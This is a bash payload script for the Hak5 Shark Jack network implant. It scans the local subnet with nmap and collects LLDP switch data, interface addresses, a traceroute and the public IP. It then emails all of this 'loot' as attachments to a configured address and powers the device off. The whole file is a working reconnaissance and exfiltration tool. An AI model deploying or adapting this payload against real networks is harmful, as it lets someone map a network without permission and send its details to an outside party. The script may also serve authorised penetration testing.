#!/bin/bash
#
# Title:         Network Recon Payload with email exfiltration
# Author:        Topknot (Based on the orignial HAK5 sample payload and MonsieurMarc Sample Nmap Payload with Patebil exfiltration)
# Version:       1.0
#
# This payload:
# 
# Performs an nmap ping scan of the local subnet and logs it to a text file
# Pulls LLDP neighbor and switch information and logs it to a text file
# Performs an IFconfig and ip addr show and logs it to a text file
# Performs a traceroute to 8.8.8.8 and logs it to a text file
# Performs a public IP address lookup via curl and icanhazip.com and logs it to a text file
# Sends all of the created text files via email to the address set with MAIL_RCPT
# 
# A nameserver, 1.1.1.1, is set for the payload in case you want to run it in arming mode.
#
# This payload requires you to have curl, lldpd, and msmtp mutt already installed and configured via opkg
# 
# Guide for MSMTP MUTT can be found here https://forum.openwrt.org/t/openwrt-how-to-send-mail-with-attachment-with-mutt-and-msmtp-gmail/45844
#
# Red ...........Setup
# Amber..........Scanning
# Green..........Finished
#
# See nmap --help for options. Default "-sP" ping scans the address space for
# fast host discovery.
#
# Please enter your email details below
#

MAIL_RCPT=EnterEmail@Here.com

NMAP_OPTIONS="-sP"
LOOT_DIR_NMAP=/root/loot/nmap
LOOT_DIR_LLDPD=/root/loot/lldpd
LOOT_DIR_IFCONFIG=/root/loot/ifconfig
LOOT_DIR_TRACEROUTE=/root/loot/traceroute
LOOT_DIR_ICANHAZIP=/root/loot/icanhazip

SCAN_DIR=/etc/shark/nmap
LLDPD_DIR=/etc/shark/lldpd
IFCONFIG_DIR=/etc/shark/ifconfig
TRACEROUTE_DIR=/etc/shark/traceroute
ICANHAZIP_DIR=/etc/shark/icanhazip

DNS_FILE=/etc/resolv.conf
MUTT_FILE=/root/.muttrc


function finish() {
	LED CLEANUP
	# Kill Nmap
	wait $1
	kill $1 &> /dev/null

	# Sync filesystem
	echo $SCAN_M > $SCAN_FILE
	echo $LLDPD_M > $LLDPD_FILE
	echo $IFCONFIG_M > $IFCONFIG_FILE
	echo $TRACEROUTE_M > $TRACEROUTE_FILE
	echo $ICANHAZIP_M > $ICANHAZIP_FILE
	sync
	sleep 1s
 
 
	#Email the loot as an attachment
	email
	sleep 5s

	LED FINISH
	sleep 1s

	# Halt system
	halt
}

function setup() {
	LED SETUP
	
	# Configure DNS Server
	echo "nameserver 1.1.1.1" > $DNS_FILE
	
	# Create loot directory
	mkdir -p $LOOT_DIR_NMAP &> /dev/null

	# Create tmp scan directory
	mkdir -p $SCAN_DIR &> /dev/null

	# Create tmp scan file if it doesn't exist
	SCAN_FILE=$SCAN_DIR/scan-count
	if [ ! -f $SCAN_FILE ]; then
		touch $SCAN_FILE && echo 0 > $SCAN_FILE
	fi
	
	
	# Create lldpd loot directory
	mkdir -p $LOOT_DIR_LLDPD &> /dev/null
	
	#Create tmp lldpd directory
	mkdir -p $LLDPD_DIR &> /dev/null
	
	#Create tmp lldpd file if it doesn't exist
	LLDPD_FILE=$LLDPD_DIR/lldpd-count
	if [ ! -f $LLDPD_FILE ]; then
		touch $LLDPD_FILE && echo 0 > $LLDPD_FILE
	fi
	
	
	# Create ifconfig loot directory
	mkdir -p $LOOT_DIR_IFCONFIG &> /dev/null
	
	#Create tmp ifconfig directory
	mkdir -p $IFCONFIG_DIR &> /dev/null
	
	#Create tmp ifconfig file if it doesn't exist
	IFCONFIG_FILE=$IFCONFIG_DIR/ifconfig-count
	if [ ! -f $IFCONFIG_FILE ]; then
		touch $IFCONFIG_FILE && echo 0 > $IFCONFIG_FILE
	fi
	
	
	# Create traceroute loot directory
	mkdir -p $LOOT_DIR_TRACEROUTE &> /dev/null
	
	#Create tmp traceroute directory
	mkdir -p $TRACEROUTE_DIR &> /dev/null
	
	#Create tmp traceroute file if it doesn't exist
	TRACEROUTE_FILE=$TRACEROUTE_DIR/traceroute-count
	if [ ! -f $TRACEROUTE_FILE ]; then
		touch $TRACEROUTE_FILE && echo 0 > $TRACEROUTE_FILE
	fi
	
	
		# Create icanhazip loot directory
	mkdir -p $LOOT_DIR_ICANHAZIP &> /dev/null
	
	#Create tmp icanhazip directory
	mkdir -p $ICANHAZIP_DIR &> /dev/null
	
	#Create tmp icanhazip file if it doesn't exist
	ICANHAZIP_FILE=$ICANHAZIP_DIR/icanhazip-count
	if [ ! -f $ICANHAZIP_FILE ]; then
		touch $ICANHAZIP_FILE && echo 0 > $ICANHAZIP_FILE
	fi
	
	
	# Find IP address and subnet
	while [ -z "$SUBNET" ]; do
		sleep 1s && find_subnet
	done
	
}

function find_subnet() {
	SUBNET=$(ip addr | grep -i eth0 | grep -i inet | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}[\/]{1}[0-9]{1,2}" | sed 's/\.[0-9]*\//\.0\//')
}

function run() {
	# Run setup
	setup

	#Preflight NMAP
	SCAN_N=$(cat $SCAN_FILE)
	SCAN_M=$(( $SCAN_N + 1 ))

	LED ATTACK
	
	#Start nmap scan
	nmap $NMAP_OPTIONS $SUBNET -oN $LOOT_DIR_NMAP/nmap-scan_$SCAN_M.txt &>/dev/null &
	tpid=$!
	
	
	# Preflight LLDPD
	LLDPD_N=$(cat $LLDPD_FILE)
	LLDPD_M=$(( $LLDPD_N + 1 ))
	#Start LLDPD
	lldpcli show neighbor details > $LOOT_DIR_LLDPD/lldpd_$LLDPD_M.txt
	lldpcli show interfaces details >> $LOOT_DIR_LLDPD/lldpd_$LLDPD_M.txt


	# Preflight IFCONFIG
	IFCONFIG_N=$(cat $IFCONFIG_FILE)
	IFCONFIG_M=$(( $IFCONFIG_N + 1 ))
	#Start IFCONFIG
	ifconfig eth0 > $LOOT_DIR_IFCONFIG/ifconfig_$IFCONFIG_M.txt
	ip addr show dev eth0 >> $LOOT_DIR_IFCONFIG/ifconfig_$IFCONFIG_M.txt


	# Preflight TRACEROUTE
	TRACEROUTE_N=$(cat $TRACEROUTE_FILE)
	TRACEROUTE_M=$(( $TRACEROUTE_N + 1 ))
	#Start TRACEROUTE
	traceroute 8.8.8.8 > $LOOT_DIR_TRACEROUTE/traceroute_$TRACEROUTE_M.txt
	
	
	# Preflight ICANHAZIP
	ICANHAZIP_N=$(cat $ICANHAZIP_FILE)
	ICANHAZIP_M=$(( $ICANHAZIP_N + 1 ))
	#Start ICANHAZIP
	curl icanhazip.com > $LOOT_DIR_ICANHAZIP/icanhazip_$ICANHAZIP_M.txt
	
	
	#End Payloads
	finish $tpid
}

function email() {	
	#Send the loot files to the email destination via msmtp
    echo "Yarr, You have new loot from Shark Jack!" | mutt -F $MUTT_FILE -a $LOOT_DIR_NMAP/nmap-scan_$SCAN_M.txt -a $LOOT_DIR_LLDPD/lldpd_$LLDPD_M.txt -a $LOOT_DIR_IFCONFIG/ifconfig_$IFCONFIG_M.txt -a $LOOT_DIR_TRACEROUTE/traceroute_$TRACEROUTE_M.txt -a $LOOT_DIR_ICANHAZIP/icanhazip_$ICANHAZIP_M.txt -s "Shark Jack Loot" -- $MAIL_RCPT
}


# Run payload
run &
